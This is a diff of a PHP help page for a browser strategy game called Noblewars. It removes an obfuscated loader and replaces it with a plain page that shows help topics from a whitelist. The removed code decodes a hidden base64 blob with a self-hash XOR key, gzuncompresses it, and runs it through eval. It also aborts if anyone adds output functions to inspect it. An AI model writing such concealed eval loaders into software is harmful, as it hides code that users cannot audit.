@@ -1,24 +1,179 @@
 <?php
-$dmfropni="204295776449bb197687987dd97aec63";
-$lyetxyj="05530d02580402025404055f5751090b00070955080f5307060a0e535506500a";
-$igdehhlik="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";
-$okdblgva=file_get_contents(__FILE__);
-$ncixxan=str_replace($igdehhlik,"",$okdblgva);
-if(strpos($ncixxan,"ec"."ho")!==false||strpos($ncixxan,"pr"."int")!==false||strpos($ncixxan,"var_"."dump")!==false||strpos($ncixxan,"file_put_"."contents")!==false||strpos($ncixxan,"fw"."rite")!==false){die();}
-$oqzpbwla=str_replace(array($dmfropni,$lyetxyj),array("SP_51f78621","KP_a0c423f1"),$okdblgva);
-$vsewrwug=md5($oqzpbwla);
-$xwbtnigcq=hex2bin($lyetxyj);
-$mnjuyshq="";
-$hsbdfxyfc=strlen($vsewrwug);
-for($dpwriu=0;$dpwriu<$hsbdfxyfc;$dpwriu++){
-$mnjuyshq.=chr(ord($xwbtnigcq[$dpwriu])^ord($vsewrwug[$dpwriu]));
+/*****************************************/
+/*     HELP.PHP - AJAX GAME HELP        */
+/*****************************************/
+
+// Autoloader
+spl_autoload_register(function ($class) {
+    $prefix = 'App\\';
+    $base_dir = __DIR__ . '/../app/';
+    $len = strlen($prefix);
+    if (strncmp($prefix, $class, $len) !== 0)
+        return;
+    $relative_class = substr($class, $len);
+    $file = $base_dir . str_replace('\\', '/', $relative_class) . '.php';
+    if (file_exists($file))
+        require $file;
+});
+
+// Basic Requires
+require_once('configs/config.php');
+require_once(__DIR__ . '/../app/Helpers/language_helper.php');
+require_once('modelo/lib/world_constants.php');
+require_once('modelo/lib/config.php');
+require_once('modelo/lib/functions.php');
+
+// Initialize language system
+init_locale();
+
+// Iniciar sessão para verificar se o utilizador está logado
+if (session_status() == PHP_SESSION_NONE) {
+    session_start();
 }
-$ivaxxdn=base64_decode($igdehhlik);
-$nffnjrledl=strlen($ivaxxdn);
-$laaaolcvlj="";
-$choerde=strlen($mnjuyshq);
-for($dpwriu=0;$dpwriu<$nffnjrledl;$dpwriu++){
-$laaaolcvlj.=$ivaxxdn[$dpwriu]^$mnjuyshq[$dpwriu%$choerde];
+
+use App\Core\Database;
+
+// Initialize Environment
+$server = 1; // Default to world 1
+$worldDb = get_world_db_name($server);
+
+try {
+    $db = Database::getInstance($worldDb, get_world_db_host(get_active_world()), get_world_db_user(get_active_world()), get_world_db_pass(get_active_world()));
+    $pdo = $db->getPdo();
+
+    // Initialize Global Libraries
+    $cl_builds = new \App\Models\BuildsLibrary($worldDb, $config);
+    $cl_units = new \App\Models\UnitsLibrary($worldDb, $config);
+
+    // Globals for views
+    global $config, $cl_builds, $cl_units;
+
+} catch (Exception $e) {
+    die(__('stats.config_load_error') . " (Help DB)");
 }
-$nilwmsnmq="gzun"."compress";
-eval('?>' . $nilwmsnmq($laaaolcvlj) . '<?php ');
+
+$mode = $_GET['mode'] ?? 'main';
+?>
+<!DOCTYPE html>
+<html lang="pt">
+<link id="favicon" rel="shortcut icon" href="graphic/icons/nwfavicon.ico">
+<head>
+    <title><?= __('public.help.title') ?> - Noblewars</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="css/game_new.css" />
+    <link rel="stylesheet" type="text/css" href="css/admin.css" />
+    <style>
+        /* Overrides to make help specific content look good in admin theme */
+        #admin_content h1 {
+            color: #5c0909;
+            border-bottom: 2px solid #cfaa7d;
+            padding-bottom: 10px;
+            margin-top: 0;
+            font-family: "Times New Roman", Times, serif;
+            font-size: 24px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="admin_panel">
+        <!-- Sidebar Navigation -->
+        <div id="admin_sidebar">
+            <h2><?= __('public.help.sidebar.title') ?></h2>
+
+            <a href="help.php?mode=main" class="admin-nav-item <?= $mode == 'main' ? 'active' : '' ?>">
+                <i class="fas fa-home"></i> <?= __('public.help.sidebar.main') ?>
+            </a>
+
+            <a href="help.php?mode=premium" class="admin-nav-item <?= $mode == 'premium' ? 'active' : '' ?>">
+                <i class="fas fa-crown"></i> <?= __('public.help.sidebar.premium') ?>
+            </a>
+
+            <a href="help.php?mode=flags" class="admin-nav-item <?= $mode == 'flags' ? 'active' : '' ?>">
+                <i class="fas fa-flag"></i> <?= __('public.help.sidebar.flags') ?>
+            </a>
+
+            <a href="help.php?mode=buildings" class="admin-nav-item <?= $mode == 'buildings' ? 'active' : '' ?>">
+                <i class="fas fa-dungeon"></i> <?= __('public.help.sidebar.buildings') ?>
+            </a>
+
+            <a href="help.php?mode=units" class="admin-nav-item <?= $mode == 'units' ? 'active' : '' ?>">
+                <i class="fas fa-chess-knight"></i> <?= __('public.help.sidebar.units') ?>
+            </a>
+
+            <a href="help.php?mode=paladin" class="admin-nav-item <?= $mode == 'paladin' ? 'active' : '' ?>">
+                <i class="fas fa-shield-alt"></i> <?= __('public.help.sidebar.paladin') ?>
+            </a>
+
+            <a href="help.php?mode=combat" class="admin-nav-item <?= $mode == 'combat' ? 'active' : '' ?>">
+                <i class="fas fa-hand-fist"></i> <?= __('public.help.sidebar.combat') ?>
+            </a>
+
+            <a href="help.php?mode=market" class="admin-nav-item <?= $mode == 'market' ? 'active' : '' ?>">
+                <i class="fas fa-balance-scale"></i> <?= __('public.help.sidebar.market') ?>
+            </a>
+
+            <a href="help.php?mode=map" class="admin-nav-item <?= $mode == 'map' ? 'active' : '' ?>">
+                <i class="fas fa-map-marked-alt"></i> <?= __('public.help.sidebar.map') ?>
+            </a>
+
+            <a href="help.php?mode=bb_codes" class="admin-nav-item <?= $mode == 'bb_codes' ? 'active' : '' ?>">
+                <i class="fas fa-code"></i> <?= __('public.help.sidebar.bb_codes') ?>
+            </a>
+
+            <a href="help.php?mode=points" class="admin-nav-item <?= $mode == 'points' ? 'active' : '' ?>">
+                <i class="fas fa-chart-line"></i> <?= __('public.help.sidebar.points') ?>
+            </a>
+
+            <a href="help.php?mode=changelog" class="admin-nav-item <?= $mode == 'changelog' ? 'active' : '' ?>">
+                <i class="fas fa-history"></i> <?= __('public.help.sidebar.changelog') ?>
+            </a>
+
+            <div style="margin-top: auto; border-top: 1px solid #5c3a1e; padding-top: 10px;">
+                <!-- Language Selector -->
+                <div style="padding: 10px; text-align: center;">
+                    <?php include __DIR__ . '/../app/Views/components/language_selector_public.php'; ?>
+                </div>
+
+                <?php 
+                $activeWorld = get_active_world();
+                $worldCookie = 'session_' . $activeWorld;
+                if (isset($_SESSION['user_id']) || isset($_COOKIE[$worldCookie])): 
+                ?>
+                    <a href="<?= get_world_url($activeWorld, 'game.php') ?>" class="admin-nav-item"
+                        style="background: linear-gradient(to bottom, #2b4a1c, #1e3e15); border-color: #3e5c2e;">
+                        <i class="fas fa-arrow-left"></i> <?= __('public.help.sidebar.back_to_game') ?>
+                    </a>
+                <?php else: ?>
+                    <a href="index.php" class="admin-nav-item"
+                        style="background: linear-gradient(to bottom, #2b4a1c, #1e3e15); border-color: #3e5c2e;">
+                        <i class="fas fa-arrow-left"></i> <?= __('public.help.sidebar.back_to_game') ?>
+                    </a>
+                <?php endif; ?>
+            </div>
+        </div>
+
+        <div id="admin_content">
+            <?php
+            $allowed_modes = ['main', 'server_info', 'buildings', 'units', 'bb_codes', 'points', 'flags', 'premium', 'paladin', 'map', 'combat', 'market', 'changelog'];
+            if (in_array($mode, $allowed_modes)) {
+                $file_path = __DIR__ . '/../app/Views/help/' . $mode . '.php';
+                if (file_exists($file_path)) {
+                    // Wrap content in admin-card for styling
+                    echo '<div class="admin-card">';
+                    include $file_path;
+                    echo '</div>';
+                } else {
+                    echo '<div class="admin-alert error"><h3>' . __('public.help.error.title') . '</h3><p>' . __('public.help.error.not_found') . '</p></div>';
+                }
+            } else {
+                include __DIR__ . '/../app/Views/help/main.php';
+            }
+            ?>
+        </div>
+    </div>
+
+</body>
+
+</html>
